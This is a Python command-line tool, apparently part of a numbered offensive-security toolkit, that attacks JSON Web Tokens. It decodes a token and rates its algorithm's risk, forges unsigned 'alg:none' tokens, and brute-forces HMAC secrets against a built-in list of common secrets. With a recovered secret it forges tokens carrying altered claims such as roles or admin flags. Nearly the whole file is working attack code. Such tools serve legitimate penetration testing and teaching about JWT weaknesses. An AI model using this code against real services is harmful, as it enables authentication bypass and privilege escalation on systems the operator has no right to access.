#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════╗
║  04 · JWT ATTACKER                   ║
║  JWT analysis, forgery & attacks     ║
╚══════════════════════════════════════╝
Usage: python3 04_jwt_attacker.py -t <token>
"""

import base64, json, hmac, hashlib, argparse, sys
from colorama import Fore, Style, init
init(autoreset=True)

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════╗
║  🔓 JWT ATTACKER  v1.0               ║
║  Decode · alg:none · weak secret     ║
╚══════════════════════════════════════╝{Style.RESET_ALL}
"""

COMMON_SECRETS = [
    "secret","password","123456","qwerty","admin","key","jwt",
    "secret123","mysecret","jwtkey","supersecret","changeme",
    "your-256-bit-secret","your-secret","HS256","token","api",
    "jwt_secret","app_secret","django-insecure","flask-secret",
]

def b64d(data: str) -> bytes:
    data += "=" * (4 - len(data) % 4)
    return base64.urlsafe_b64decode(data)

def b64e(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def decode_token(token: str) -> tuple:
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None, None, None
    try:
        header  = json.loads(b64d(parts[0]))
        payload = json.loads(b64d(parts[1]))
        return header, payload, parts[2]
    except Exception as e:
        return None, None, None

def forge_none_alg(token: str) -> str:
    """Attack: change algorithm to 'none' to bypass signature."""
    parts = token.strip().split(".")
    if len(parts) != 3:
        return None
    header = json.loads(b64d(parts[0]))
    header["alg"] = "none"
    new_header    = b64e(json.dumps(header, separators=(",",":")).encode())
    return f"{new_header}.{parts[1]}."

def forge_modified_payload(token: str, key: str, changes: dict, alg: str = "HS256") -> str:
    """Forge a token with modified claims using known secret."""
    parts = token.strip().split(".")
    if len(parts) != 3: return None
    header  = json.loads(b64d(parts[0]))
    payload = json.loads(b64d(parts[1]))
    payload.update(changes)
    header["alg"] = alg
    new_h   = b64e(json.dumps(header,  separators=(",",":")).encode())
    new_p   = b64e(json.dumps(payload, separators=(",",":")).encode())
    msg     = f"{new_h}.{new_p}".encode()
    if alg == "HS256":
        sig = hmac.new(key.encode(), msg, hashlib.sha256).digest()
    elif alg == "HS384":
        sig = hmac.new(key.encode(), msg, hashlib.sha384).digest()
    elif alg == "HS512":
        sig = hmac.new(key.encode(), msg, hashlib.sha512).digest()
    else:
        return f"{new_h}.{new_p}."
    return f"{new_h}.{new_p}.{b64e(sig)}"

def verify_signature(token: str, secret: str, alg: str = "HS256") -> bool:
    parts = token.strip().split(".")
    if len(parts) != 3: return False
    msg = f"{parts[0]}.{parts[1]}".encode()
    try:
        h_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        hf    = h_map.get(alg.upper(), hashlib.sha256)
        expected = b64e(hmac.new(secret.encode(), msg, hf).digest())
        return hmac.compare_digest(expected, parts[2])
    except: return False

def brute_secret(token: str, alg: str, wordlist: list) -> str | None:
    parts = token.strip().split(".")
    if len(parts) != 3: return None
    for secret in wordlist:
        if verify_signature(token, secret, alg):
            return secret
    return None

def check_expiry(payload: dict) -> str:
    import time
    exp = payload.get("exp")
    if not exp: return f"{Fore.YELLOW}Sin expiración (exp no definido)"
    now  = time.time()
    diff = exp - now
    if diff < 0: return f"{Fore.RED}EXPIRADO hace {abs(diff/3600):.1f}h"
    if diff < 300: return f"{Fore.YELLOW}Expira en {diff:.0f}s"
    return f"{Fore.GREEN}Válido — expira en {diff/3600:.1f}h"

def print_analysis(header: dict, payload: dict):
    alg = header.get("alg","?")
    print(f"\n  {Fore.CYAN}═══ HEADER ═══{Style.RESET_ALL}")
    for k,v in header.items():
        print(f"  {k:<12}: {Fore.YELLOW}{v}{Style.RESET_ALL}")
    print(f"\n  {Fore.CYAN}═══ PAYLOAD ═══{Style.RESET_ALL}")
    for k,v in payload.items():
        print(f"  {k:<12}: {Fore.YELLOW}{v}{Style.RESET_ALL}")
    print(f"\n  {Fore.CYAN}═══ ANÁLISIS ═══{Style.RESET_ALL}")
    # Algorithm risk
    alg_risks = {
        "none":  f"{Fore.RED}CRÍTICO — Sin firma",
        "HS256": f"{Fore.YELLOW}MEDIO — Vulnerable a brute-force si secreto débil",
        "HS384": f"{Fore.YELLOW}MEDIO — Idem",
        "HS512": f"{Fore.YELLOW}MEDIO — Idem",
        "RS256": f"{Fore.GREEN}SEGURO — Asimétrico",
        "RS384": f"{Fore.GREEN}SEGURO — Asimétrico",
        "RS512": f"{Fore.GREEN}SEGURO — Asimétrico",
        "ES256": f"{Fore.GREEN}SEGURO — ECDSA",
    }
    print(f"  Algoritmo    : {alg_risks.get(alg, f'{Fore.WHITE}Desconocido')}{Style.RESET_ALL}")
    print(f"  Expiración   : {check_expiry(payload)}{Style.RESET_ALL}")
    # Sensitive fields
    sensitive = ["admin","role","is_admin","superuser","staff","privilege","email","sub"]
    found_sens = [k for k in payload if k.lower() in sensitive]
    if found_sens:
        print(f"  {Fore.YELLOW}Campos sensibles: {found_sens}{Style.RESET_ALL}")

def main():
    print(BANNER)
    parser = argparse.ArgumentParser(description="JWT Attacker")
    parser.add_argument("-t","--token",    help="Token JWT a analizar")
    parser.add_argument("-s","--secret",   default=None, help="Secreto para verificar/forjar")
    parser.add_argument("--none-attack",   action="store_true",  help="Forjar token con alg:none")
    parser.add_argument("--brute",         action="store_true",  help="Brute-force secreto")
    parser.add_argument("-w","--wordlist",  default=None,         help="Wordlist para brute-force")
    parser.add_argument("--forge",         nargs=2, metavar=("FIELD","VALUE"), help="Modificar campo en payload")
    args = parser.parse_args()

    token = args.token or input(f"{Fore.CYAN}Token JWT: {Style.RESET_ALL}").strip()
    header, payload, sig = decode_token(token)

    if not header:
        print(f"{Fore.RED}[✗] Token inválido o malformado"); sys.exit(1)

    print_analysis(header, payload)

    if args.none_attack:
        forged = forge_none_alg(token)
        print(f"\n{Fore.RED}[ALG:NONE ATTACK]{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}{forged}{Style.RESET_ALL}")
        print(f"  {Fore.GRAY}(Enviar este token — si el servidor acepta alg=none: VULNERABLE){Style.RESET_ALL}")

    if args.brute:
        alg      = header.get("alg","HS256")
        wordlist = COMMON_SECRETS
        if args.wordlist:
            try:
                with open(args.wordlist) as f:
                    wordlist = [l.strip() for l in f if l.strip()] + COMMON_SECRETS
            except: pass
        print(f"\n{Fore.CYAN}[*] Brute-force secreto ({len(wordlist)} palabras)...\n")
        secret = brute_secret(token, alg, wordlist)
        if secret:
            print(f"  {Fore.GREEN}[✓] SECRETO ENCONTRADO: '{secret}'{Style.RESET_ALL}")
            if args.forge:
                field, value = args.forge
                forged = forge_modified_payload(token, secret, {field: value}, alg)
                print(f"\n{Fore.RED}[FORGED TOKEN — {field}={value}]{Style.RESET_ALL}")
                print(f"  {Fore.YELLOW}{forged}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.YELLOW}[!] Secreto no encontrado en wordlist{Style.RESET_ALL}")

    if args.secret and not args.brute:
        alg   = header.get("alg","HS256")
        valid = verify_signature(token, args.secret, alg)
        print(f"\n  Firma con '{args.secret}': "
              f"{'✓ VÁLIDA' if valid else '✗ INVÁLIDA'}")
        if valid and args.forge:
            field, value = args.forge
            forged = forge_modified_payload(token, args.secret, {field: value}, alg)
            print(f"\n{Fore.RED}[FORGED TOKEN — {field}={value}]{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}{forged}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
